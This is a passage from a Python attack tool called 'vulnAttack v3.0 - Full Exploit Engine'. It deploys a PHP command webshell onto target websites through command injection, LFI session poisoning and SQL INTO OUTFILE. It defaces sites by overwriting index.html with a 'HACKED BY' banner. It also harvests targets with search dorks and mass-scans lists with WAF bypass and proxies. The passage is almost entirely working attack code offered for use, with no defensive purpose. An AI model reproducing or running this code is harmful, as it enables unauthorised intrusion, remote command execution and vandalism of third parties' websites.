            print(f"  {i}. {v['type']} - {v['url'][:60]}...")
        try:
            choice = input("[?] Number: ").strip()
            if not choice.isdigit():
                print_progress("Invalid input. Please enter a number.", 'error')
                return
            idx = int(choice) - 1
            if idx < 0 or idx >= len(self.vulns):
                print_progress("Invalid choice.", 'error')
                return
            vuln = self.vulns[idx]
        except Exception:
            print_progress("Invalid choice.", 'error')
            return

        templates = [t for t in self.templates.templates if 'webshell' in t]
        if not templates:
            shell_code = "<?php system($_GET['cmd']); ?>"
        else:
            print("[+] Available templates:")
            for i, t in enumerate(templates, 1):
                print(f"  {i}. {t}")
            try:
                t_choice = input("[?] Choose template: ").strip()
                if not t_choice.isdigit():
                    print_progress("Invalid input. Please enter a number.", 'error')
                    return
                t_idx = int(t_choice) - 1
                if t_idx < 0 or t_idx >= len(templates):
                    print_progress("Invalid choice.", 'error')
                    return
                shell_code = self.templates.templates[templates[t_idx]]
            except Exception:
                shell_code = "<?php system($_GET['cmd']); ?>"

        # Deploy logic (sama seperti sebelumnya)
        if vuln['type'] in ['RCE', 'Command Injection']:
            params = ['cmd', 'c', 'command', 'exec', 'system', 'x']
            for param in params:
                test_url = vuln['url'] + f"&{param}=id"
                r = self._request(test_url)
                if r and ('uid=' in r.text or 'root' in r.text or 'whoami' in r.text):
                    encoded = base64.b64encode(shell_code.encode()).decode()
                    deploy_url = vuln['url'] + f"&{param}=echo {encoded} | base64 -d > shell.php"
                    self._request(deploy_url)
                    self.shell_url = urljoin(self.base_url, 'shell.php')
                    if self.verify_webshell(self.shell_url):
                        print_progress(f"Webshell verified: {self.shell_url}", 'success')
                    else:
                        print_progress(f"Webshell deployed but not verified: {self.shell_url}", 'warning')
                    return
            # Fallback
            encoded = base64.b64encode(shell_code.encode()).decode()
            deploy_url = vuln['url'] + f"&cmd=echo {encoded} | base64 -d > shell.php"
            self._request(deploy_url)
            self.shell_url = urljoin(self.base_url, 'shell.php')
            if self.verify_webshell(self.shell_url):
                print_progress(f"Webshell verified (fallback): {self.shell_url}", 'success')
            else:
                print_progress(f"Webshell deployed (fallback): {self.shell_url}", 'warning')

        elif vuln['type'] == 'LFI':
            params = ['file', 'page', 'view', 'include', 'path', 'doc', 'template']
            for param in params:
                test_url = vuln['url'] + f"&{param}=../../../../etc/passwd"
                r = self._request(test_url)
                if r and 'root:x:' in r.text:
                    session_id = self.session.cookies.get('PHPSESSID', 'test')
                    poison = f"/tmp/sess_{session_id}"
                    encoded = base64.b64encode(shell_code.encode()).decode()
                    deploy_url = vuln['url'] + f"&{param}={poison}&cmd=echo {encoded} | base64 -d > /tmp/shell.php"
                    self._request(deploy_url)
                    self.shell_url = urljoin(self.base_url, '/tmp/shell.php')
                    if self.verify_webshell(self.shell_url):
                        print_progress(f"Webshell via LFI verified: {self.shell_url}", 'success')
                    else:
                        print_progress(f"Webshell via LFI deployed: {self.shell_url}", 'warning')
                    return
            # Fallback
            session_id = self.session.cookies.get('PHPSESSID', 'test')
            poison = f"/tmp/sess_{session_id}"
            encoded = base64.b64encode(shell_code.encode()).decode()
            deploy_url = vuln['url'] + f"&file={poison}&cmd=echo {encoded} | base64 -d > /tmp/shell.php"
            self._request(deploy_url)
            self.shell_url = urljoin(self.base_url, '/tmp/shell.php')
            if self.verify_webshell(self.shell_url):
                print_progress(f"Webshell via LFI verified (fallback): {self.shell_url}", 'success')
            else:
                print_progress(f"Webshell via LFI deployed (fallback): {self.shell_url}", 'warning')

        elif vuln['type'] == 'SQLi':
            try:
                shell_hex = ''.join(f'\\x{ord(c):02x}' for c in shell_code)
                deploy_url = vuln['url'] + f"' UNION SELECT '{shell_hex}' INTO OUTFILE '/var/www/html/shell.php'-- -"
                self._request(deploy_url)
                self.shell_url = urljoin(self.base_url, 'shell.php')
                if self.verify_webshell(self.shell_url):
                    print_progress(f"Webshell via SQLi verified: {self.shell_url}", 'success')
                else:
                    print_progress(f"Webshell via SQLi deployed: {self.shell_url}", 'warning')
            except Exception:
                print_progress("SQLi deploy failed, try manual.", 'warning')
        else:
            print_progress("Cannot deploy with this vuln type.", 'warning')

    # ========== DEFACE ==========
    def deface_website(self):
        if not self.vulns:
            print_progress("No vuln found.", 'error')
            return
        print_section("DEFACE WEBSITE")
        print("[+] Choose vulnerability:")
        for i, v in enumerate(self.vulns, 1):
            print(f"  {i}. {v['type']} - {v['url'][:60]}...")
        try:
            choice = input("[?] Number: ").strip()
            if not choice.isdigit():
                print_progress("Invalid input. Please enter a number.", 'error')
                return
            idx = int(choice) - 1
            if idx < 0 or idx >= len(self.vulns):
                print_progress("Invalid choice.", 'error')
                return
            vuln = self.vulns[idx]
        except Exception:
            print_progress("Invalid choice.", 'error')
            return

        deface_templates = [t for t in self.templates.templates if 'deface' in t]
        if not deface_templates:
            deface_content = "<h1>HACKED BY APIPBOYS</h1>"
        else:
            print("[+] Available templates:")
            for i, t in enumerate(deface_templates, 1):
                print(f"  {i}. {t}")
            try:
                t_choice = input("[?] Choose template: ").strip()
                if not t_choice.isdigit():
                    print_progress("Invalid input. Please enter a number.", 'error')
                    return
                t_idx = int(t_choice) - 1
                if t_idx < 0 or t_idx >= len(deface_templates):
                    print_progress("Invalid choice.", 'error')
                    return
                deface_content = self.templates.templates[deface_templates[t_idx]]
            except Exception:
                deface_content = "<h1>HACKED BY APIPBOYS</h1>"

        if vuln['type'] in ['RCE', 'Command Injection']:
            params = ['cmd', 'c', 'command', 'exec', 'system', 'x']
            for param in params:
                test_url = vuln['url'] + f"&{param}=id"
                r = self._request(test_url)
                if r and ('uid=' in r.text or 'root' in r.text or 'whoami' in r.text):
                    encoded = base64.b64encode(deface_content.encode()).decode()
                    deploy_url = vuln['url'] + f"&{param}=echo {encoded} | base64 -d > index.html"
                    self._request(deploy_url)
                    self.deface_url = urljoin(self.base_url, 'index.html')
                    print_progress(f"Deface deployed: {self.deface_url}", 'success')
                    return
            # Fallback
            encoded = base64.b64encode(deface_content.encode()).decode()
            deploy_url = vuln['url'] + f"&cmd=echo {encoded} | base64 -d > index.html"
            self._request(deploy_url)
            self.deface_url = urljoin(self.base_url, 'index.html')
            print_progress(f"Deface (fallback): {self.deface_url}", 'success')
        else:
            print_progress("Deface only works with RCE or Command Injection.", 'warning')

    # ========== GENERATE POC ==========
    def generate_poc(self):
        output_dir = CONFIG['output_dir']
        os.makedirs(output_dir, exist_ok=True)
        poc_file = os.path.join(output_dir, f"poc_{self.domain}.html")
        html = f"""
        <html><head><title>POC - {self.domain}</title></head>
        <body>
        <h1>Vulnerability Report</h1>
        <p>Target: {self.target}</p>
        <p>Scan Date: {datetime.now()}</p>
        <p>Total Major Vuln: {len(self.vulns)}</p>
        <h2>Major Vulnerabilities</h2>
        <ul>{''.join(f'<li><b>{v["type"]}</b> - {v["url"]}<br>Payload: <pre>{v["payload"]}</pre>Evidence: {v["evidence"]}</li>' for v in self.vulns)}</ul>
        <h2>Minor Vulnerabilities</h2>
        <ul>{''.join(f'<li><b>{f["type"]}</b> (Severity: {f["severity"]})<br>{f["description"]}</li>' for f in self.minor_vulns)}</ul>
        <p>Webshell: {self.shell_url or 'N/A'}</p>
        <p>Deface: {self.deface_url or 'N/A'}</p>
        <h2>Deep Analysis</h2>
        <pre>{json.dumps(self.deep_report, indent=2)}</pre>
        </body></html>
        """
        with open(poc_file, 'w', encoding='utf-8') as f:
            f.write(html)
        print_progress(f"POC saved: {poc_file}", 'success')

    def display_menu(self):
        print_section("INTERACTIVE MENU")
        print("  [1] Deploy Webshell")
        print("  [2] Deface Website")
        print("  [3] Generate POC")
        print("  [4] Show Deep Analysis")
        print("  [5] Show Minor Vulnerabilities")
        print("  [6] Scan Another Target")
        print("  [7] Exit")

    def run(self):
        print(BANNER)
        print_progress(f"Target: {self.target}", 'info')
        print_section("CRAWLING & ANALYSIS")
        self.crawl(self.target)

        print_section("VULNERABILITY TESTING")
        self.test_sqli()
        self.test_xss()
        self.test_lfi()
        self.test_rce()
        self.test_ssrf()
        self.test_xxe()
        self.test_nosqli()
        self.test_ssti()
        self.test_cmd_injection()
        self.test_ldap()
        self.test_open_redirect()
        self.test_csrf()
        self.test_file_upload()
        self.test_directory_traversal()

        print_progress(f"Found {len(self.vulns)} major vulnerabilities.", 'success')
        print_progress(f"Found {len(self.minor_vulns)} minor vulnerabilities.", 'info')
        if self.vulns:
            for v in self.vulns:
                print(f"  - {v['type']} @ {v['url'][:80]}...")

        while True:
            self.display_menu()
            opt = input("[?] Choose (1-7): ").strip()
            if opt == '1':
                self.deploy_webshell()
            elif opt == '2':
                self.deface_website()
            elif opt == '3':
                self.generate_poc()
            elif opt == '4':
                print(json.dumps(self.deep_report, indent=2))
            elif opt == '5':
                if self.minor_vulns:
                    for f in self.minor_vulns:
                        print(f"  [{f['severity']}] {f['type']}: {f['description']}")
                else:
                    print_progress("No minor vulnerabilities found.", 'info')
            elif opt == '6':
                new_target = input("[?] Enter new target URL: ").strip()
                if new_target.startswith('http'):
                    self.target = new_target
                    self.base_url = self._get_base_url()
                    self.domain = urlparse(new_target).netloc
                    self.vulns = []
                    self.minor_vulns = []
                    self.scanned_urls = set()
                    self.shell_url = None
                    self.deface_url = None
                    self.run()
                    return
                else:
                    print_progress("Invalid URL.", 'error')
            elif opt == '7':
                print_progress("Exiting...", 'info')
                break
            else:
                print_progress("Invalid choice.", 'error')

        self.generate_poc()
        print_progress("Scan completed.", 'success')

# ================================================================
# MULTI-THREAD SCAN
# ================================================================
def scan_multiple(targets, threads=5, use_proxy=False, bypass_waf=False):
    pl = PayloadLoader()
    tl = TemplateLoader()
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(scan_single, t, pl, tl, use_proxy, bypass_waf): t for t in targets}
        for future in as_completed(futures):
            target = futures[future]
            try:
                future.result()
            except Exception as e:
                print_progress(f"Failed {target}: {e}", 'error')

def scan_single(target, pl, tl, use_proxy=False, bypass_waf=False):
    try:
        scanner = VulnAttack(target, pl, tl, use_proxy, bypass_waf)
        scanner.run()
        return True
    except Exception as e:
        print_progress(f"Error on {target}: {e}", 'error')
        return False

# ================================================================
# MAIN
# ================================================================
def main():
    print(BANNER)

    bypass_waf = '--bypass-waf' in sys.argv
    use_proxy = '--proxy' in sys.argv

    if '--delay' in sys.argv:
        try:
            idx = sys.argv.index('--delay')
            CONFIG['delay'] = int(sys.argv[idx+1])
        except:
            pass

    if '--output' in sys.argv:
        try:
            idx = sys.argv.index('--output')
            CONFIG['output_dir'] = sys.argv[idx+1]
        except:
            pass

    if len(sys.argv) < 2:
        print(f"""
\033[92m[+] INSTALLATION COMPLETE!
\033[93m[+] You can now run:
\033[96m  python vulnAttack.py http://target.com
\033[96m  python vulnAttack.py --dork "inurl:index.php?id="
\033[96m  python vulnAttack.py --list targets.txt --threads 20
\033[96m  python vulnAttack.py --bypass-waf --dork ...
\033[96m  python vulnAttack.py --proxy --list targets.txt
\033[95m[+] MENU (saat menjalankan tanpa argumen):
\033[97m  1. Scan target         (masukkan URL)
\033[97m  2. Dorking             (masukkan dork)
\033[97m  3. Scan list target    (masukkan file target)
\033[97m  4. Help                (tampilkan bantuan)
\033[97m  5. Exit                (keluar)
\033[0m""")
        while True:
            print_section("MAIN MENU")
            print("  [1] Scan Target")
            print("  [2] Dorking")
            print("  [3] Scan List Target")
            print("  [4] Help")
            print("  [5] Exit")
            choice = input("[?] Choose (1-5): ").strip()
            if choice == '1':
                target = input("[?] Enter target URL: ").strip()
                if not target.startswith('http'):
                    target = 'http://' + target
                use_proxy_opt = input("[?] Use proxy? (y/n): ").strip().lower() == 'y'
                bypass_opt = input("[?] Bypass WAF/Cloudflare? (y/n): ").strip().lower() == 'y'
                pl = PayloadLoader()
                tl = TemplateLoader()
                scanner = VulnAttack(target, pl, tl, use_proxy_opt, bypass_opt)
                scanner.run()
            elif choice == '2':
                dork = input("[?] Enter dork: ").strip()
                if dork:
                    use_proxy_opt = input("[?] Use proxy? (y/n): ").strip().lower() == 'y'
                    bypass_opt = input("[?] Bypass WAF/Cloudflare? (y/n): ").strip().lower() == 'y'
                    pl = PayloadLoader()
                    tl = TemplateLoader()
                    dummy = VulnAttack('http://dummy.com', pl, tl, use_proxy_opt, bypass_opt)
                    targets = dummy.dork_engine.dork_all(dork, 50)
                    for t in targets:
                        print(f"  {t}")
            elif choice == '3':
                file_path = input("[?] Enter target file path: ").strip()
                if os.path.exists(file_path):
                    with open(file_path, 'r') as f:
                        targets = [line.strip() for line in f if line.strip()]
                    print_progress(f"Loaded {len(targets)} targets", 'info')
                    threads = input("[?] Threads (default 10): ").strip()
                    threads = int(threads) if threads.isdigit() else 10
                    use_proxy_opt = input("[?] Use proxy? (y/n): ").strip().lower() == 'y'
                    bypass_opt = input("[?] Bypass WAF/Cloudflare? (y/n): ").strip().lower() == 'y'
                    scan_multiple(targets, threads, use_proxy_opt, bypass_opt)
                else:
                    print_progress("File not found!", 'error')
            elif choice == '4':
                print("Help:\n  python vulnAttack.py <target_url>\n  python vulnAttack.py --dork <dork>\n  python vulnAttack.py --list <file> [--threads N]\n  python vulnAttack.py --bypass-waf\n  python vulnAttack.py --proxy\n  python vulnAttack.py --delay N\n  python vulnAttack.py --output <dir>")
            elif choice == '5':
                print_progress("Goodbye!", 'info')
                sys.exit(0)
            else:
                print_progress("Invalid choice!", 'error')
        return

    pl = PayloadLoader()
    tl = TemplateLoader()

    if sys.argv[1] == '--dork':
        if len(sys.argv) < 3:
            print_progress("Enter dork.", 'error')
            sys.exit(1)
        dork = sys.argv[2]
        dummy = VulnAttack('http://dummy.com', pl, tl, use_proxy, bypass_waf)
        targets = dummy.dork_engine.dork_all(dork, 50)
        for t in targets:
            print(t)
        sys.exit(0)

    elif sys.argv[1] == '--list':
        if len(sys.argv) < 3:
            print_progress("Enter target file.", 'error')
            sys.exit(1)
        file_target = sys.argv[2]
        if not os.path.exists(file_target):
            print_progress("File not found!", 'error')
            sys.exit(1)
        with open(file_target, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
        threads = CONFIG['threads']
        if '--threads' in sys.argv:
            try:
                idx = sys.argv.index('--threads')
                threads = int(sys.argv[idx+1])
            except:
                pass
        scan_multiple(targets, threads, use_proxy, bypass_waf)
        sys.exit(0)

    elif sys.argv[1] == '--help':
        print("""
vulnAttack v3.0 - Full Exploit Engine
Options:
  <target_url>    : Scan single target
  --dork <dork>   : Multi-Dorking
  --list <file>   : Scan multiple targets from file
  --threads N     : Number of threads (default 10)
  --bypass-waf    : Enable WAF/Cloudflare bypass (requires cloudscraper)
  --proxy         : Enable proxy (requires config/proxy.txt)
  --delay N       : Delay between requests in seconds (default 1)
  --output <dir>  : Output directory (default: results)
  --help          : Show this help
""")
        sys.exit(0)

    else:
        target = sys.argv[1]
        if not target.startswith('http'):
            target = 'http://' + target
        scanner = VulnAttack(target, pl, tl, use_proxy, bypass_waf)
        scanner.run()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        sys.exit(1)